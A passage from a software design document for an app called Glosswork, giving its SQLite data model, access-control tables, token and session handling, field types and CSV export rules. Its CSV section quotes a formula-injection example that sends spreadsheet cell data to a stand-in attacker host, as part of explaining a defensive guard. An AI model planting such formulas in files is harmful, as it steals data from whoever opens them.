# Glosswork: Data Model

Normative companion to [PRD.md](../PRD.md). Decisions here are settled; implement them as written
unless a concrete problem forces a change, in which case record the change and its reason.

SQL below is illustrative SQLite DDL showing intent, column semantics, and indexing strategy. The
implementation owns exact types, naming, and migration mechanics.

---

## 1. Design summary

- One `records` table holds every record of every object type. User-defined field values live in a
  JSON document in the `data` column.
- Filtering and sorting go through `json_extract(data, '$.field_key')`. Fields marked `indexed`
  get a partial expression index scoped to their object type.
- Relations live in a separate link table, which is what makes many-to-many and self-referential
  relations free.
- Comments, audit events, and embeddings are separate first-class tables.
- All authorship and attribution points at `principals`, never at `users`.
- The object type is the grain of access control (DD-11): a record is exactly as visible as
  its type, never more or less. Three tables carry the decision -- `principals.role` says whether a
  principal is a system administrator, `object_type_grants` says how much a given principal may do
  to a given type, and `object_types.default_level` says what a principal with no grant row gets.
  No table below the object type narrows or widens this; there is no field-level or record-level
  access.

The reason for the JSON column is DD-1.

## 2. Identity and attribution

### principals

The single actor table. A principal is either a human who can log in or a service account that
only holds tokens. **Every `created_by`, `updated_by`, author, and audit actor column references
this table.**

```sql
CREATE TABLE principals (
  id            TEXT PRIMARY KEY,              -- uuid
  type          TEXT NOT NULL,                 -- 'user' | 'service_account'
  display_name  TEXT NOT NULL,
  email         TEXT UNIQUE,                   -- null for service accounts
  role          TEXT NOT NULL DEFAULT 'member',-- 'admin' | 'creator' | 'member'
  auth_provider TEXT,                          -- 'oidc' | 'local' | null (service accounts)
  external_id   TEXT,                          -- Okta subject claim
  password_hash TEXT,                          -- local standalone mode only
  is_active     INTEGER NOT NULL DEFAULT 1,
  description   TEXT,                          -- purpose of a service account
  created_at    TEXT NOT NULL,
  created_by    TEXT REFERENCES principals(id),
  workspace_id  TEXT NOT NULL DEFAULT 'default'
);
CREATE UNIQUE INDEX ix_principals_external
  ON principals(auth_provider, external_id) WHERE external_id IS NOT NULL;
```

Service-account rows are supported by the schema at MVP. Their management UI is post-MVP. This is
the entire cost of supporting standalone agents later.

`role` includes `creator` (DD-11), ordered `member < creator < admin`. A `creator` may
define its own object types and holds `admin` credential scope through `role_scope`, because every
schema route declares `admin`; what keeps it out of `/api/v1/admin/*` and `/api/v1/principals*` is
`require_role`, not its scope. The role was added by editing migration 1's `CHECK` in place,
before migrations were frozen, rather than by rebuilding the table twelve others hold foreign keys
into.

### object_type_grants (DD-11)

The third authorization axis: how much one principal may do to one object type.

```sql
CREATE TABLE object_type_grants (
  id             TEXT PRIMARY KEY,
  object_type_id TEXT NOT NULL REFERENCES object_types(id),
  principal_id   TEXT NOT NULL REFERENCES principals(id),
  level          TEXT NOT NULL,                 -- 'none' | 'read' | 'write' | 'admin'
  created_at     TEXT NOT NULL,
  created_by     TEXT NOT NULL REFERENCES principals(id),
  updated_at     TEXT NOT NULL,
  updated_by     TEXT NOT NULL REFERENCES principals(id)
);
CREATE UNIQUE INDEX ux_object_type_grants ON object_type_grants(object_type_id, principal_id);
CREATE INDEX ix_object_type_grants_principal ON object_type_grants(principal_id);
```

`level = 'none'` is legal and meaningful: an **explicit deny** that overrides a permissive
`object_types.default_level`. Without it, a type open to everyone by default could not exclude one
person. Revoking is different: it removes the row and returns the principal to the default.

`ix_object_type_grants_principal` is what makes `AccessService.accessible_type_ids` a bounded read
-- the principal's grants and the live types' defaults, resolved in memory -- rather than one probe
per object type on every cross-type read.

A principal with no row here gets `object_types.default_level`; a `role == 'admin'` principal is
implicitly `admin` on every type and is never looked up here at all. The composition, and the
credential ceiling over it, are DD-11.

### access_tokens

```sql
CREATE TABLE access_tokens (
  id            TEXT PRIMARY KEY,
  principal_id  TEXT NOT NULL REFERENCES principals(id),
  name          TEXT NOT NULL,
  token_hash    TEXT NOT NULL UNIQUE,          -- sha256 of the presented secret
  token_prefix  TEXT NOT NULL,                 -- first 8 chars, for display and lookup
  scope         TEXT NOT NULL,                 -- 'read' | 'write' | 'admin'
  expires_at    TEXT,
  last_used_at  TEXT,
  revoked_at    TEXT,
  created_at    TEXT NOT NULL,
  created_by    TEXT NOT NULL REFERENCES principals(id),
  -- migration 8 (DD-16): the upload ticket. Null on every ordinary PAT.
  capability      TEXT,   -- narrows the credential ceiling to one named operation
  capability_data TEXT,   -- JSON: the bound {"filename", "content_type"}
  consumed_at     TEXT,   -- stamped inside the transaction that spends the ticket
  -- migration 10 (DD-17): the label this token was minted for.
  agent_label     TEXT    -- null on a token minted without one, which behaves as before
);
```

The plaintext token is shown once at creation and never stored. Format: `gw_pat_<32 random chars>`.
A principal cannot mint a token with a scope exceeding its role: only `admin` principals may mint
`admin` tokens.

**Upload tickets live in this table rather than in one of their own (DD-16).** An agent
connected over MCP cannot see the bearer its client authenticates with, so it cannot issue the HTTP
upload that DD-29 requires; `create_attachment_upload` mints it a credential it *can* see. That
credential is a real row here at `write` scope with a short `expires_at` and the prefix
`gw_upl_<32 random chars>`, which is the whole reason the design is cheap: sha256-only storage,
`token_prefix` for a legible refusal, expiry enforcement in `PatTokenResolver`, the
deactivated-principal check, and the revoke-everything on a password reset or a deactivation are
all inherited rather than restated.

`capability` narrows the DD-11 credential ceiling from "any write" to one named operation, and only
ever narrows -- it grants nothing. It is read for authorization at exactly one predicate,
`scopes.refuse_capability_credential`, which refuses it everywhere; one route
(`POST /api/v1/attachments`) opts back in, and the MCP adapter calls the same predicate because
`/mcp` is scope-exempt by design. `capability_data` holds the bound filename and content type,
which win over the multipart request's and are what make a ticket unrepurposable. `consumed_at` is
set with a conditional `UPDATE ... WHERE consumed_at IS NULL` **inside the same transaction that
inserts the `attachments` row**, so two concurrent uses cannot both win and a rollback un-spends
the ticket.

Migration 8 adds the three columns and **no index**: lookup is by `token_hash`, already `UNIQUE`,
and the only query the new columns serve is the opportunistic purge of expired, consumed and
revoked tickets that runs as one is minted. Migration 4 is deliberately not amended in place. These
rows are excluded from `list_tokens`, so an administrator cannot see or hand-revoke a live one;
that cost is accepted because a ticket expires in minutes and the containment action that matters
already reaches it.

**`agent_label` is the label the token was minted for (migration 10).** It is a plain string
and not an `agent_labels.id`: registration stays at the edge on first use (DD-17, FR-I6), a
registry id would need a second `register_use` call site, and a credential row does not take a
foreign key into a per-principal registry. `resolve_agent_label_id` reads it **last**, beneath a
per-call `agent` parameter and the `X-Agent-Label` header, so a call from a labeled token that
sends no header is attributed to the token's label everywhere attribution appears. It grants
nothing and no authorization predicate reads it. A malformed label is refused **at mint** by
`AgentLabelService.validate_label`, because one stored here would otherwise refuse every later
call the token made.

Migration 10 adds the column with **no index and no backfill**: every existing row is correctly
`NULL`, meaning "this token carries no label of its own", and the column is only ever read through
the row already fetched by `token_hash`, which is `UNIQUE`. Migrations 4 and 8
are deliberately not amended in place (DD-6). An upload ticket does **not** inherit the label of
the token that minted it: `attachments` carries no label column at all, so the only attribution a
ticket could add is on its audit event, which the call that minted the ticket already labeled.

### sessions

Browser sessions (FR-A3, DD-9). Shaped deliberately like `access_tokens`: the plaintext
cookie value is shown once, at issue time, and never stored — only its sha256.

```sql
CREATE TABLE sessions (
  id            TEXT PRIMARY KEY,
  principal_id  TEXT NOT NULL REFERENCES principals(id),
  session_hash  TEXT NOT NULL UNIQUE,          -- sha256 of the presented cookie value
  csrf_hash     TEXT NOT NULL,                 -- sha256 of the DD-10 double-submit token
  created_at    TEXT NOT NULL,
  expires_at    TEXT NOT NULL,                 -- absolute lifetime (GW_SESSION_LIFETIME_HOURS)
  last_seen_at  TEXT NOT NULL,                 -- idle lifetime (GW_SESSION_IDLE_HOURS)
  revoked_at    TEXT
);
```

`csrf_hash` binds the DD-10 double-submit token to the session server-side rather than a second
table: an attacker who plants a `gw_csrf` cookie still cannot make it match a hash the server
holds. Resolution checks the identical set of conditions `access_tokens` does — unknown, revoked,
expired, or belonging to a deactivated principal — plus the idle bound, and refuses with the same
`invalid_token` code either way, so the two credential types cannot disagree about what a refusal
looks like. Role is never cached here: scope is derived from the principal's *current* `role`
(`role_scope`) on every resolution, so a demotion takes effect with no re-login.

### sign_in_codes

Emailed sign-in codes (FR-I18, DD-45), migration 13. One row per code a person asked for, written
whether or not the address can sign in, so verification cannot tell a known address from an
unknown one. The code is never stored: `code_hash` is the sha256 of `"<id>:<code>"`.

```sql
CREATE TABLE sign_in_codes (
  id           TEXT PRIMARY KEY,
  email        TEXT NOT NULL,          -- trimmed, lowercased
  code_hash    TEXT NOT NULL,          -- sha256 of "<id>:<code>"
  created_at   TEXT NOT NULL,
  expires_at   TEXT NOT NULL,          -- ten minutes after created_at
  attempts     INTEGER NOT NULL DEFAULT 0,
  consumed_at  TEXT,                   -- set on success, and at the fifth wrong guess
  sent         INTEGER NOT NULL        -- 1 when the address could sign in and a send was made
);
CREATE INDEX ix_sign_in_codes_email ON sign_in_codes(email, created_at);
```

The per-address limits (five an hour, twenty a day) are counted from this table. Rows older than a
day are deleted when a new code is written, and rows for addresses that cannot sign in are capped
at 10,000 a day. A sha256 rather than a slow hash: a six-digit code has a million values, so its
protection is its lifetime, its attempt cap and the limits.

### invites

Invitations (FR-I19), migration 13. No person exists until the invited address signs in with a
code; `principal_id` then names the person the acceptance created or reactivated.

```sql
CREATE TABLE invites (
  id            TEXT PRIMARY KEY,
  email         TEXT NOT NULL,         -- trimmed, lowercased
  display_name  TEXT NOT NULL,
  role          TEXT NOT NULL CHECK (role IN ('admin', 'creator', 'member')),
  invited_by    TEXT NOT NULL REFERENCES principals(id),
  created_at    TEXT NOT NULL,
  accepted_at   TEXT,
  principal_id  TEXT REFERENCES principals(id),
  revoked_at    TEXT,
  revoked_by    TEXT REFERENCES principals(id)
);
CREATE UNIQUE INDEX ix_invites_live_email ON invites(email)
  WHERE accepted_at IS NULL AND revoked_at IS NULL;
```

An invite is live while it is neither accepted nor revoked, younger than fourteen days, and its
`invited_by` is an active `admin`; all of it is checked inside the verifying transaction. An open
invite that is no longer live is revoked when its address is invited again, so the unique index
never blocks an address for good.

### agent_labels

Per-principal registry, auto-populated on first use (FR-I6).

```sql
CREATE TABLE agent_labels (
  id            TEXT PRIMARY KEY,
  principal_id  TEXT NOT NULL REFERENCES principals(id),
  label         TEXT NOT NULL,                 -- the raw string the agent sends
  display_name  TEXT,                          -- user-assigned friendly name
  description   TEXT,                          -- what this agent does
  verified      INTEGER NOT NULL DEFAULT 0,    -- 1 once the user names it
  first_seen_at TEXT NOT NULL,
  last_seen_at  TEXT NOT NULL,
  call_count    INTEGER NOT NULL DEFAULT 0
);
CREATE UNIQUE INDEX ix_agent_labels ON agent_labels(principal_id, label);
```

Two different users may use the same label string; they are independent rows. An unknown label is
never rejected, only auto-created as `verified = 0`. Administrators query across all principals for
the cross-user view (FR-I7).

### usage_counters and usage_meta (DD-39)

What an operator reads through `GET /api/v1/usage`. The only tables in this schema a tenant
cannot reach at all.

```sql
CREATE TABLE usage_counters (
  tool_name  TEXT NOT NULL,                    -- a registered tool, or the literal 'unknown_tool'
  error_code TEXT NOT NULL,                    -- a STATUS_BY_CODE key, 'unknown', or 'ok'
  count      INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (tool_name, error_code)
);
CREATE TABLE usage_meta (
  key   TEXT PRIMARY KEY,
  value TEXT NOT NULL                          -- 'counting_since', written by migration 11
);
```

**Neither string column can hold a value a tenant chose**, and that is closed at write time
rather than described. The tool name in a `tools/call` is the caller's own string, so
`services/usage.py::counter_key` writes it only when `ToolCatalog.required_scope` knows it and
otherwise the literal `unknown_tool`; it writes `error_code` only when the code is a key of
`errors.STATUS_BY_CODE` and otherwise the literal `unknown`. Without that rule this table would
take an arbitrary 200-character value from anyone holding a token and have unbounded cardinality.

`error_code` is `NOT NULL`, carrying the literal `ok` for a call that succeeded, because SQLite
permits NULLs in a PRIMARY KEY and a nullable column would admit duplicate success rows for one
tool. The endpoint reports it back as JSON `null`.

**Rows are written by a flush, never by a call.** Counts accumulate in memory at the MCP seam and
are written on an interval and at shutdown, because a read tool called with no agent label opens
zero write transactions today and a row per call would put a writer-lock acquisition on exactly
the traffic this table exists to measure. An operator's read merges what has not been flushed yet,
so the numbers are exact and the read still opens no write transaction.

`usage_meta.counting_since` is written by migration 11 itself, which is the only way it can mean
"when this database began counting": a fresh volume runs the migration at first boot and gets its
own value. A hosting operator that sees the counters fall reads it to tell a replaced volume from
a workspace that genuinely went quiet.

### ActorContext

Not a table. A request-scoped value object assembled at the edge and required by every service
write method (DD-4):

```
ActorContext {
  principal_id: str
  principal_type: 'user' | 'service_account'
  agent_label_id: str | None
  auth_method: 'session' | 'pat'
  surface: 'ui' | 'api' | 'mcp'
  request_id: str
  scope: 'read' | 'write' | 'admin'
}
```

## 3. Schema definition tables

### object_types

```sql
CREATE TABLE object_types (
  id            TEXT PRIMARY KEY,
  key           TEXT NOT NULL UNIQUE,          -- 'initiative', immutable after creation
  name          TEXT NOT NULL,                 -- 'Initiative'
  name_plural   TEXT NOT NULL,
  description   TEXT NOT NULL,                 -- agent-facing, required
  key_prefix    TEXT NOT NULL UNIQUE,          -- 'INIT'
  key_counter   INTEGER NOT NULL DEFAULT 0,    -- last allocated sequence number
  icon          TEXT,
  is_deleted    INTEGER NOT NULL DEFAULT 0,
  default_level TEXT NOT NULL DEFAULT 'none',  -- 'none'|'read'|'write'|'admin' (DD-11)
  display_field_key TEXT,                      -- a fields.key, no FK; nullable (DD-23)
  created_at    TEXT NOT NULL,
  created_by    TEXT NOT NULL REFERENCES principals(id),
  updated_at    TEXT NOT NULL,
  updated_by    TEXT NOT NULL REFERENCES principals(id),
  workspace_id  TEXT NOT NULL DEFAULT 'default'
);
```

`default_level` is what a principal with **no** `object_type_grants` row gets on this type
(DD-11). It is declared here on migration 1's `CREATE TABLE` rather than added by a later
migration, so no database holds a type whose access a backfill would have to guess. Every type is
therefore uniformly closed at creation, with no split-brain between types created before access
levels existed and types created after. `PATCH /api/v1/object-types/{key}` changes it, under `admin` scope plus `admin`
level on the type.

`display_field_key` names the field whose value labels a record for a human -- in a search hit's
`title`, in a compact projection, and beside every link to that record (DD-23, FR-S11). It
holds a **`fields.key`, not a `fields.id`**: `create_object_type` inserts the `object_types` row
before any field row exists, so an id could not be populated on that INSERT without a second
UPDATE inside the transaction, while a key is supplied by the caller and immutable after creation.
The cost is that it carries no foreign key and may dangle. That is closed at the one place a field
disappears -- approving a `delete_field` proposal nulls a matching `display_field_key` in the same
transaction -- and a dangling value is harmless in any case: `services/base.py::display_field`
falls back rather than raising, because a record must always be labelable.

`NULL` means nobody has chosen, and is a working value rather than a missing one. It is also
declared here on migration 1's `CREATE TABLE` rather than added by a later migration, on
`default_level`'s standing above and for the same reason.

The fallback, when the column is `NULL` or dangles or names an ineligible field, is the
position-derived rule that predates the column: the type's first non-relation field by declared position.
`create_object_type`'s **default** is deliberately a different rule -- the first *eligible* field,
skipping a leading `relation`, `attachment` or `user_ref` -- because it is choosing a key, and an
immediately-unusable one is no choice at all. Two rules that read alike and are not the same.

`PATCH /api/v1/object-types/{key}` changes it under `admin` level on the type. It raises no schema
proposal and is not destructive: no stored record value moves, only how one is labeled. Setting it
to `null` explicitly returns the type to the derived rule.

`description` is required at creation. Reject empty or whitespace-only descriptions with an error
explaining that descriptions are how agents interpret the schema.

### fields

```sql
CREATE TABLE fields (
  id             TEXT PRIMARY KEY,
  object_type_id TEXT NOT NULL REFERENCES object_types(id),
  key            TEXT NOT NULL,                -- 'target_date', immutable after creation
  name           TEXT NOT NULL,
  description    TEXT NOT NULL,                -- agent-facing, required
  type           TEXT NOT NULL,                -- see section 4
  position       INTEGER NOT NULL,
  is_required    INTEGER NOT NULL DEFAULT 0,
  is_unique      INTEGER NOT NULL DEFAULT 0,
  is_indexed     INTEGER NOT NULL DEFAULT 0,   -- drives expression index creation
  embed          INTEGER NOT NULL DEFAULT 0,   -- include in the search indexes (section 10)
  default_value  TEXT,                         -- JSON-encoded
  config         TEXT NOT NULL DEFAULT '{}',   -- JSON, type-specific (see section 4)
  is_deleted     INTEGER NOT NULL DEFAULT 0,
  created_at     TEXT NOT NULL,
  created_by     TEXT NOT NULL REFERENCES principals(id),
  updated_at     TEXT NOT NULL,
  updated_by     TEXT NOT NULL REFERENCES principals(id)
);
CREATE UNIQUE INDEX ix_fields_key ON fields(object_type_id, key) WHERE is_deleted = 0;
```

`embed` defaults to `1` for `long_text` and `0` for everything else. It gates the keyword
index as well as the vector index, and is honored only on `short_text` and `long_text`
fields; see the eligibility rule at the head of section 10.

**`key` is lowercase snake_case (`^[a-z][a-z0-9_]*$`, max 63 chars) and eight names are
reserved** (DD-20): `key`, `created_at`, `updated_at`, `created_by`, `updated_by`,
`deleted_at`, `comment_count`, `last_comment_at` — the system pseudo-fields queryable on every
object type (section 4's filter grammar, FR-R7). A field of the same name would shadow the
system one: `filters.py`'s `FilterContext.lookup` consults `fields_by_key` first, so
`created_by eq @me` on such a type compiles to `json_extract(data, '$.created_by')` — an
attacker-writable value — while a projection and a multi-type `search` read the real column, so
one filter means two things depending on where it is asked. `fieldtypes.validate_field_key` is
the one place the rule lives; it is its own entry point rather than a branch inside
`validate_key`, whose free-form `what` argument cannot carry a rule. Object type keys
are **not** covered: a type named `key` shares no namespace with a filter's field names. The set
is read from `fieldtypes.PSEUDO_FIELDS` and published as `key_rules.reserved_field_keys` in
`describe_capabilities`; a future pseudo-field is reserved by being added to that dict.

A deployment created before the rule existed may already hold such a field. It is **reported,
never rewritten**: `SchemaService.reserved_key_collisions` walks the live schema at startup and the
lifespan logs each hit at `warning` (see docs/DEPLOYMENT.md on reserved field keys). Renaming
would rewrite `records.data` over user data with no undo, and flipping precedence so the column
wins would silently change every filter and saved view already reading it.

### schema_proposals

Destructive schema changes land here instead of applying (FR-S6).

```sql
CREATE TABLE schema_proposals (
  id             TEXT PRIMARY KEY,
  status         TEXT NOT NULL,   -- 'pending' | 'approved' | 'rejected' | 'expired'
  change_type    TEXT NOT NULL,   -- 'delete_field' | 'change_field_type' | 'delete_object_type'
                                  -- | 'remove_enum_option' | 'tighten_constraint'
  target_type_id TEXT REFERENCES object_types(id),
  target_field_id TEXT REFERENCES fields(id),
  payload        TEXT NOT NULL,   -- JSON: the requested change
  impact         TEXT NOT NULL,   -- JSON: affected_count, sample_values, coercion_failures
  snapshot_ref   TEXT,            -- set on approval, points at the pre-change data snapshot
  reason         TEXT,            -- why the caller wants this
  proposed_at    TEXT NOT NULL,
  proposed_by    TEXT NOT NULL REFERENCES principals(id),
  proposed_agent TEXT REFERENCES agent_labels(id),
  decided_at     TEXT,
  decided_by     TEXT REFERENCES principals(id),
  decision_note  TEXT
);
```

The `impact` document is computed at proposal time and **recomputed at approval time**, because
data may have changed in between. If the recomputed blast radius differs materially, approval
returns the new impact and requires re-confirmation.

## 4. Field types

`config` is a JSON object whose shape depends on `type`. `Stored as` describes the JSON value
written into `records.data`.

`Display` is whether a field of this type may be an object type's `display_field_key`
(`fieldtypes.py::is_display_eligible`, surfaced on the wire as
`FieldDoc.display_eligible`).

| Type | Stored as | `config` keys | Display | Notes |
| --- | --- | --- | --- | --- |
| `short_text` | string | `max_length` | yes | Single-line. `embed` opt-in. |
| `long_text` | string | `format` (`markdown`/`plain`) | yes | Multi-line. `embed` defaults on. Chunked for embedding. |
| `integer` | number | `min`, `max` | yes | Stored as a JSON integer, not a string. |
| `decimal` | number | `precision`, `scale` | yes | Stored as a JSON number. |
| `boolean` | boolean | none | yes | |
| `date` | string | none | yes | ISO-8601 `YYYY-MM-DD`. Lexically sortable, which is why it is a string. |
| `datetime` | string | none | yes | ISO-8601 UTC `YYYY-MM-DDTHH:MM:SSZ`. Always stored UTC; rendered in the viewer's timezone. |
| `single_select` | string | `options[]` | yes | Each option: `{value, label, description, color, position}`. Option descriptions are agent-facing. |
| `multi_select` | array of strings | `options[]` | yes | Same option shape. |
| `user_ref` | string (principal id) | `allow_service_accounts` | **no** | See the note below. Stored as a bare principal id; four reference forms are accepted on the way in, and names come back in a per-document sidecar that a search hit and a relation `display` never carry. |
| `relation` | not in `data` | `target_type_key`, `cardinality`, `inverse_field_key` | **no** | Values live in `record_links`, not in `data` at all. See section 6. |
| `url` | string | none | yes | Validated as a URL. Treated as text for search. |
| `attachment` | array of attachment ids | `max_files`, `max_bytes` | **no** | A list of opaque blob ids, which can never read as a label. Metadata in `attachments`; bytes on the volume. Contents are not indexed at MVP. |

**The canonical timestamp form is the rule for what a client sends, not only for what is stored**:
every timestamp crossing the API, a `datetime` field value and an access token's
`expires_at` alike, is `YYYY-MM-DDTHH:MM:SSZ`, UTC at second precision with no fractional seconds
and no other offset. `timeutil.parse_datetime` is strict against anything else, so a client that
sends `2027-01-31T00:00:00.000Z` is refused with `validation_failed` rather than quietly
reinterpreted.

**A client builds that string from a picked date's own parts, never through a `Date`**:
handing the picker's `YYYY-MM-DD` to `new Date(string)` reads it as UTC, and handing its parts to
`new Date(year, month, day, ...)` reads them as the browser's local time, so either path names the
wrong calendar day for a viewer whose timezone is not UTC. Section 5 of `docs/DESIGN.md` states
the parallel rule for reading a stored date-only value back out.

Absent optional values are stored by **omitting the key** from `data`, not by writing `null`. This
makes `is_null` and `is_not_null` unambiguous and keeps documents small.

### `user_ref` references (DD-24)

**The stored value is always a bare principal id.** Nothing below changes what is in `data`; it is
all about what is accepted on the way in and what rides alongside on the way out, which is why
accepting these forms needs no migration, no coercion rule and no reindex.

Four reference forms are accepted, resolved by `services/principals.py::resolve_principal_ref` --
the single funnel every `user_ref` value passes through, on the write path and in filters alike.
First match wins:

| Order | Form | Resolves to |
| --- | --- | --- |
| 1 | `@me` | the calling principal |
| 2 | an exact principal id | itself |
| 3 | an exact email address | that principal (`principals.email` is UNIQUE) |
| 4 | an exact display name, case-insensitively | that principal, **only if exactly one candidate matches** |

The order is the contract: an id can never be shadowed by someone's display name, and `@me` can
never be one either. An ambiguous display name is `validation_failed` naming every candidate with
its email address; it is never resolved by picking. An unresolvable value is `validation_failed`
in a filter too, not an empty result set.

**Active and inactive principals are treated differently by reads and writes.**

| Caller | Accepts a deactivated principal | Why |
| --- | --- | --- |
| Filters (`query_records`, `bulk_update`'s selector, `search`) | yes | Finding a departed colleague's still-open work is the handover query, and a filter is a read. |
| `create_record`, `bulk_update`'s values | no | A fresh assignment to someone who has left is a mistake. |
| `update_record` | no, **except** an id equal to the value already stored on that field | Re-submitting an unchanged value is not a new assignment. This is what keeps the detail card's per-field Edit and CSV re-import of an exported record working after somebody leaves. |

Resolution by name or by email on a write never returns a deactivated principal, in any caller.

**`config.allow_service_accounts` is enforced**, at that same funnel, not only allowed by
`fieldtypes.py`. It defaults to `true`, so a field that never set it accepts service accounts, and
`false` rejects a service account by id and by name. It
is never consulted for `created_by` or `updated_by`, which are `user_ref` *pseudo-fields* and carry
no `config` at all.

**Names come back as a sidecar.** Every response document that carries a record also carries a
`principals` map, keyed by principal id, holding `display_name`, `email` and `is_active` for each
`user_ref` value plus `created_by` and `updated_by`. It is assembled in the service layer and costs
one read per response document, not one per record. `role` is not in it. See DD-25 for why it is a
sidecar rather than a resolved value, and for why DD-25's repository-layer join does not transfer.

### Coercion rules for type changes

A field type change (a destructive proposal) dry-runs coercion across every record:

- `short_text` to `long_text`: always safe.
- `long_text` to `short_text`: fails rows exceeding `max_length`.
- text to `integer` / `decimal`: fails rows that do not parse.
- text to `date` / `datetime`: fails rows that do not parse as ISO-8601.
- text to `single_select`: fails rows whose value is not an existing option, unless the approver
  elects to create options from distinct values.
- `single_select` to `multi_select`: always safe (wraps in an array).
- `multi_select` to `single_select`: fails rows with more than one value.
- Anything to `relation` or `attachment`: not supported; the field must be recreated.

### CSV cells (DD-20)

CSV is the one export format a program opens and *evaluates*. A spreadsheet treats a cell that
begins with `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, so a stored
`=HYPERLINK("http://evil.example/?"&A1,"Click me")` would execute when an analyst opened the
file. Any writer on a type could plant one; whoever exported the type would be the victim.

Export therefore prefixes one `'` when the rendered cell matches `^'*[=+\-@\t\r]`, and import
strips one leading `'` when the raw cell matches `^'+[=+\-@\t\r]`. **Counting the apostrophe run
is what makes the pair injective**: prefixing only on a bare trigger would export a stored
`'=foo` verbatim, import would strip it to `=foo`, and two distinct stored values would collapse
into one. Under the run-length rule `=foo` becomes `'=foo` becomes `''=foo` becomes `'''=foo`,
each stripping back exactly, and a value matching neither pattern is untouched on both sides.

The guard reads the **field type**, never the value's Python type, and covers exactly the four
types that can carry a formula: `short_text`, `long_text`, `single_select`, `multi_select`.
`integer` and `decimal` are excluded because `-5` is a number and prefixing it would break the
numeric round trip. `date`, `datetime` and `boolean` render from typed values. `url` and
`user_ref` are fences rather than members: `^https?://[^\s]+$` is enforced at both sites that
admit a `url` value, and a `user_ref` value is a bare principal id, so neither can begin with a
trigger. The `key` column and relation cells never reach the renderer and are record keys
matching `^[A-Z][A-Z0-9]{1,9}-\d+$`.

A `multi_select` is guarded **once, on the joined cell**, never per member: a spreadsheet
evaluates a cell that *starts* with a trigger, so member two of `a|=b` is already inert, and
prefixing it would produce `a|'=b`, which the import resolver splits and matches against the
option set. That is a miss, and with `create_missing_options` on it would silently create an
option literally named `'=b`. The strip runs once on the raw cell before any resolver sees it,
for the same reason: both select resolvers coerce against the option set before a strip placed
after them would run. The header row is untouched; field keys match the key pattern and the one
literal column is `key`.

Three costs, stated rather than discovered:

- A `long_text` beginning `- item` or `+ item`, an ordinary markdown bullet list, exports with a
  leading apostrophe. The round trip stays exact; the file reads oddly to a human.
- A hand-written CSV whose cell is a deliberate literal `'=x` loses one apostrophe on import.
  That is the price of a symmetric pair.
- A `single_select` or `multi_select` value beginning with a tab or a carriage return does not
  survive the round trip, because both resolvers strip whitespace. The
  exported cell is still inert, which is what the guard is for. The four printable triggers round-trip
  exactly on all four guarded types.

The JSON export (`/admin/export`) is out of scope: it is a document, not a spreadsheet.

## 5. Records

```sql
CREATE TABLE records (
  id             TEXT PRIMARY KEY,             -- uuid
  object_type_id TEXT NOT NULL REFERENCES object_types(id),
  key            TEXT NOT NULL UNIQUE,         -- 'INIT-014'
  key_seq        INTEGER NOT NULL,             -- 14
  version        INTEGER NOT NULL DEFAULT 1,
  data           TEXT NOT NULL DEFAULT '{}',   -- JSON document of user field values
  created_at     TEXT NOT NULL,
  created_by     TEXT NOT NULL REFERENCES principals(id),
  updated_at     TEXT NOT NULL,
  updated_by     TEXT NOT NULL REFERENCES principals(id),
  updated_by_agent_label_id                    -- migration 9: the agent label of the write
                 TEXT REFERENCES agent_labels(id),  -- that last changed a VALUE, else NULL
  deleted_at     TEXT,
  deleted_by     TEXT REFERENCES principals(id),
  comment_count  INTEGER NOT NULL DEFAULT 0,   -- denormalized, maintained transactionally
  last_comment_at TEXT,
  workspace_id   TEXT NOT NULL DEFAULT 'default'
);
CREATE INDEX ix_records_type_live ON records(object_type_id) WHERE deleted_at IS NULL;
CREATE INDEX ix_records_updated   ON records(updated_at);
```

### The hand that last changed a row (migration 9)

`docs/DESIGN.md` 6.4's `By` column needs the *agent* that last changed a row. `ActorContext`
carries one (DD-4) and DD-17 puts one on every surface, so the audit trail records it, but
`updated_by` is a principal id and nothing else. `updated_by_agent_label_id` denormalises the
label onto the row.

**It is written exactly where `updated_by` is written, and nowhere else.** Three sites do:
`create_record_in_txn`, and the two `update_record_row` calls that change field values. Six do
not, and each for the same reason `updated_by` does not move there: delete and restore change no
value (`fieldtypes.py` defines `updated_by` as the last *value* change), comment-counter
maintenance is not a principal's write, and the two schema-driven data rewrites are the
deployment's act rather than a principal's. Writing it at a site that does not move `updated_by`
would leave a row whose person and agent name different writes — the exact misattribution the
column exists to end.

It is written on every value-changing write **including an unlabelled one**, so a person taking a
record over clears the agent's mark rather than leaving it stale.

**The backfill counts field writes and nothing else.** `audit_events.record_id` is populated by
four kinds of event and only one of them moves `updated_by`, so the migration reads
`MAX(id)` per `record_id` over `entity_type = 'record' AND action IN ('create','update')`,
covered by `ix_audit_record`. Comments, links, unlinks, deletes and restores are excluded by
name: each carries a `record_id` while changing no value, and a backfill that took "the newest
audit event" would have attributed a record to whoever last commented on it. Reciprocal links
are the sharpest case — linking A to B writes a second event stamped with B's id, so both rows
would have been marked with the linker's label. Schema-level events are excluded for free,
carrying `record_id IS NULL`. A revert *is* counted, correctly: FR-D6 implements it as a new
forward-audited write through `update_record`.

### Key allocation

`key` is assigned inside the same transaction as the insert, by incrementing
`object_types.key_counter` under a write lock and formatting `PREFIX-N` with zero-padding to at
least three digits. Counters never decrement and keys are never reused, including after deletion.

### Version checking

Every successful update increments `version`. `update_record` takes `expected_version`. On
mismatch, return HTTP 409 with the current version, the current values of the fields the caller
tried to write, and the fields that changed since the caller's version, so an agent or the UI can
present a merge (FR-R4).

### Field indexes

When a field is created or updated with `is_indexed = 1`, create a partial expression index:

```sql
CREATE INDEX ix_rec_<object_type_id_hex32>_<field_key>
  ON records(json_extract(data, '$.<field_key>'))
  WHERE object_type_id = '<id>' AND deleted_at IS NULL;
```

`<object_type_id_hex32>` is the type's UUID with its hyphens removed, which are not legal in an
unquoted identifier. **The id and not the key, and the reason is injectivity** (DD-12). A name
that joined the type *key* and the field key with `_` is not injective, because `KEY_PATTERN` admits
`_` inside both, so type `thing_a` with field `code` and type `thing` with field `a_code` would
produce one name. The id is fixed width, so exactly one `_<field_key>` can follow it and no two
(type, field) pairs can compose to the same name. Unique fields use the same form with the `ux_rec`
prefix.

Creation carries no `IF NOT EXISTS`: with injective names a collision is impossible, so a create
that finds the name taken is a bug and must fail loudly. `IF NOT EXISTS` was the mechanism that
turned the collision above into silence -- the second unique field simply got no index, and the
sentence below about uniqueness being enforced by the index stopped being true for it.

The set is maintained **declaratively**, by `SchemaService._reconcile_field_indexes`, in the same
shape as the composites below: the desired set is every live indexed or unique field whose type is
